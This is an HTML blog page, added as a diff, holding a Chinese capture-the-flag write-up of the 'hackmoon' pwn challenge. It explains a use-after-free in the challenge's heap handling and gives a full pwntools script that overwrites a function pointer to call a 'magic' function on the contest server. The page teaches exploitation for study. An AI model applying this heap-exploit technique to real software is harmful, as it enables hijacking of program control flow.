@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,writeup,pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="考点比较单一，读懂每个函数都做了什么，加上uaf的一点知识就能做了。如果开启了pie应该是用来练习绕过pie的很好的一道题。">
+<meta name="keywords" content="ctf,writeup,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒杯2019二月-pwn">
+<meta property="og:url" content="http://yoursite.com/2019/03/02/安恒杯2019二月-pwn/index.html">
+<meta property="og:site_name" content="Muirelle的博客">
+<meta property="og:description" content="考点比较单一，读懂每个函数都做了什么，加上uaf的一点知识就能做了。如果开启了pie应该是用来练习绕过pie的很好的一道题。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/NcN0DRk.png">
+<meta property="og:image" content="https://i.imgur.com/ERdPxAR.png">
+<meta property="og:image" content="https://i.imgur.com/fJkGpyY.png">
+<meta property="og:image" content="https://i.imgur.com/fmifmL5.png">
+<meta property="og:image" content="https://i.imgur.com/AJVN1Vg.png">
+<meta property="og:image" content="https://i.imgur.com/pOTxNuX.png">
+<meta property="og:image" content="https://i.imgur.com/2hA6Ead.png">
+<meta property="og:image" content="https://i.imgur.com/wtlaZgZ.png">
+<meta property="og:image" content="https://i.imgur.com/LmYbyNK.png">
+<meta property="og:updated_time" content="2019-04-01T13:14:01.733Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安恒杯2019二月-pwn">
+<meta name="twitter:description" content="考点比较单一，读懂每个函数都做了什么，加上uaf的一点知识就能做了。如果开启了pie应该是用来练习绕过pie的很好的一道题。">
+<meta name="twitter:image" content="https://i.imgur.com/NcN0DRk.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/02/安恒杯2019二月-pwn/"/>
+
+
+
+
+
+  <title>安恒杯2019二月-pwn | Muirelle的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Muirelle的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/02/安恒杯2019二月-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Muirelle">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Muirelle的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">安恒杯2019二月-pwn</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-02T08:28:09+08:00">
+                2019-03-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/03/02/安恒杯2019二月-pwn/" class="leancloud_visitors" data-flag-title="安恒杯2019二月-pwn">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>考点比较单一，读懂每个函数都做了什么，加上uaf的一点知识就能做了。如果开启了pie应该是用来练习绕过pie的很好的一道题。</p>
+<a id="more"></a>
+<h1 id="hackmoon"><a href="#hackmoon" class="headerlink" title="hackmoon"></a>hackmoon</h1><p><strong><a href="https://xpro-adl.91ctf.com/userdownload?filename=5c6cb469e9a76.zip&amp;type=attach&amp;feature=custom" target="_blank" rel="noopener">https://xpro-adl.91ctf.com/userdownload?filename=5c6cb469e9a76.zip&amp;type=attach&amp;feature=custom</a></strong></p>
+<p><img src="https://i.imgur.com/NcN0DRk.png" alt=""><br>查看保护</p>
+<p><img src="https://i.imgur.com/ERdPxAR.png" alt=""><br>主函数，圈出来的三个函数是整个程序的主要功能</p>
+<p>逐个分析：</p>
+<h2 id="add-moon"><a href="#add-moon" class="headerlink" title="add_moon"></a>add_moon</h2><p><img src="https://i.imgur.com/fJkGpyY.png" alt=""><br>moonlist是指向bss段的指针，一个指针为4字节。</p>
+<p>从下标0到4依次判断moonlist[i]是否为0，若为零则代表该指针为空，继续进行分配空间的操作。</p>
+<p>首先将moonlist[i]指向新申请的8字节heap空间中（设为chunk_A），然后<em>(_DWORD </em>)moonlist[i] = print_moon_content;将函数print_moon_content()的地址放在chunk_A的前4字节中。</p>
+<p>接着从键盘读取8字节输入，转成int存于变量size中。<br>v0 = moonlist[i]令指针v0等于moonlist[i]，所以v0也指向chunk_A。</p>
+<p>v0[1] = malloc(size);直接看不容易理解，配合反汇编的代码可以很容易理解：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0804874E	<span class="keyword">mov</span>	<span class="built_in">ebx</span>, <span class="built_in">ds</span>:moonlist[<span class="built_in">eax</span>*<span class="number">4</span>]</span><br><span class="line">	   .</span><br><span class="line">	   .</span><br><span class="line">	   .</span><br><span class="line"><span class="symbol">.text:</span>0804875C	<span class="keyword">call</span>	_malloc</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048761</span>	<span class="keyword">add</span>	<span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048764</span>	<span class="keyword">mov</span>	[<span class="built_in">ebx</span>+<span class="number">4</span>], <span class="built_in">eax</span></span><br></pre></td></tr></table></figure>
+<p>先在chunk_A后面malloc一个size大小的chunk(设为chunk_B)，再将指向chunk_B的指针返回给eax，并赋给[ebx+4]，也就是[moonlist[i]+4]，也就是*(moonlist[i]+4)，所以用户申请的空间chunk_B的地址其实存放于chunk_A的后4字节。总结：moonlist[i]指向chunk_A，chunk_A前四字节指向print_moon_content()，后四字节指向chunk_B。chunk_B存放用户输入的数据。</p>
+<p><img src="https://i.imgur.com/fmifmL5.png" alt=""></p>
+<p>最后从用户读取size大小的数据存放于chunk_B中。count递增1。</p>
+<h2 id="print-moon"><a href="#print-moon" class="headerlink" title="print_moon"></a>print_moon</h2><p><img src="https://i.imgur.com/AJVN1Vg.png" alt=""></p>
+<p>从键盘输入要打印的内容的下标转int后赋值给v1。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( moonlist[v1] )</span><br><span class="line">(*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))moonlist[v1])(moonlist[v1]);</span><br></pre></td></tr></table></figure>
+<p>随后调用打印函数就只有这一句话，看上去很难理解，所以还是回到反汇编：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">08048945</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048948</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:moonlist[<span class="built_in">eax</span>*<span class="number">4</span>]</span><br><span class="line"><span class="symbol">.text:</span>0804894F                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>					</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048951</span>                 <span class="keyword">jz</span>      short loc_8048972	#判断v1是否超出范围</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048953</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048956</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:moonlist[<span class="built_in">eax</span>*<span class="number">4</span>]	#此时<span class="built_in">eax</span>=moonlist[i]，所以<span class="built_in">eax</span>指向chunk_A</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0804895D</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">eax</span>]		</span><br><span class="line"></span><br><span class="line">#[<span class="built_in">eax</span>]取chunk_A中的值也就是print_moon_content()的地址，再赋给<span class="built_in">eax</span>。此时<span class="built_in">eax</span>指向print_moon_content()</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>0804895F                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048962</span>                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:moonlist[<span class="built_in">edx</span>*<span class="number">4</span>]	#将<span class="built_in">edx</span>也指向chunk_A。</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048969</span>                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span>0804896C                 <span class="keyword">push</span>    <span class="built_in">edx</span>	#<span class="built_in">edx</span>压栈，作为参数传递。</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0804896D</span>                 <span class="keyword">call</span>    <span class="built_in">eax</span>	#此时调用print_moon_content()，chunk_A地址作为参数。</span><br><span class="line"><span class="symbol">.text:</span>0804896F                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">10h</span></span><br></pre></td></tr></table></figure>
+<h3 id="print-moon-content"><a href="#print-moon-content" class="headerlink" title="print_moon_content"></a>print_moon_content</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">print_moon_content</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>a1为指针，打印a1+4后的内容。也就是chunk_B，用户输入的内容。</p>
+<h2 id="del-moon"><a href="#del-moon" class="headerlink" title="del_moon"></a>del_moon</h2><p><img src="https://i.imgur.com/pOTxNuX.png" alt=""></p>
+<p>读取下标。<br>先free掉chunk_B再free掉chunk_A。</p>
+<h2 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h2><p><img src="https://i.imgur.com/2hA6Ead.png" alt=""><br>发现<code>magic</code>函数，目标就是调用它。</p>
+<p>函数分析完了大致也知道是一个uaf的漏洞了，一开始想复杂了还在到处找溢出点，后面发现直接就是一个纯粹的uaf。。</p>
+<p>思路：<strong>调用两次add_moon，得到moonlist[0],moonlist[1] (大小随意，不要太大，而且不能是8字节。内容随意)，再free掉这两个moon，再调用一次add_moon（大小为8字节，内容是<code>magic</code>的地址)，最后打印moonlist[1]</strong></p>
+<p>解释：<strong>因为每调用依次add_moon就会malloc两个chunk，而且有一个是固定的8字节大小。所以add_moon两次再free两次就会出现4个free chunk存放在fastbin中，两个8字节大小，两个自定大小。当再次add_moon一个8字节大小的moon时，fastbin就会把刚才的两个8字节chunk分配给我们。而由于第二个8字节chunk是内容可控的，同时这个chunk还是moonlist[1]的头部(也就是8字节部分)，此时用<code>magic</code>的地址替换掉原来<code>print_moon_content</code>的地址，再调用print_moon打印moonlist[1]，调用<code>magic</code>函数。(如果最开始申请的两个moon大小为8字节就没办法控制另一个moon的头部信息了，所以一定不能是8字节)</strong></p>
+<p>第一次申请后：<br><img src="https://i.imgur.com/wtlaZgZ.png" alt=""></p>
+<p>最后期待的heap内容应该是这样：<br><img src="https://i.imgur.com/LmYbyNK.png" alt=""></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10013</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'Your choice :'</span>))</span><br><span class="line">    r.sendline(str(i))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_moon</span><span class="params">(size, s)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'moon size :'</span>))</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'Content :'</span>))</span><br><span class="line">    r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_moon</span><span class="params">(index)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'Index :'</span>))</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_moon</span><span class="params">(index)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'Index :'</span>))</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">add_moon(<span class="number">0x10</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">add_moon(<span class="number">0x10</span>, <span class="string">'BBBB'</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">del_moon(<span class="number">1</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">del_moon(<span class="number">0</span>)</span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">add_moon(<span class="number">0x8</span>, p32(magic))</span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line">print_moon(<span class="number">1</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/01/TAMUctf/" rel="next" title="TAMUctf">
+                <i class="fa fa-chevron-left"></i> TAMUctf
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/07/使用docker复现ctf题目/" rel="prev" title="使用docker复现ctf题目">
+                使用docker复现ctf题目 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Muirelle</p>
+              <p class="site-description motion-element" itemprop="description">吾将上下而求索</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://firstkaixin.github.io/" title="Mrkaixin" target="_blank">Mrkaixin</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackmoon"><span class="nav-number">1.</span> <span class="nav-text">hackmoon</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#add-moon"><span class="nav-number">1.1.</span> <span class="nav-text">add_moon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#print-moon"><span class="nav-number">1.2.</span> <span class="nav-text">print_moon</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#print-moon-content"><span class="nav-number">1.2.1.</span> <span class="nav-text">print_moon_content</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#del-moon"><span class="nav-number">1.3.</span> <span class="nav-text">del_moon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uaf"><span class="nav-number">1.4.</span> <span class="nav-text">uaf</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Muirelle</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("K1WEvzezolboN84rQYlF0Dvv-gzGzoHsz", "KnwfedBiA348tAxLpapkotlB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
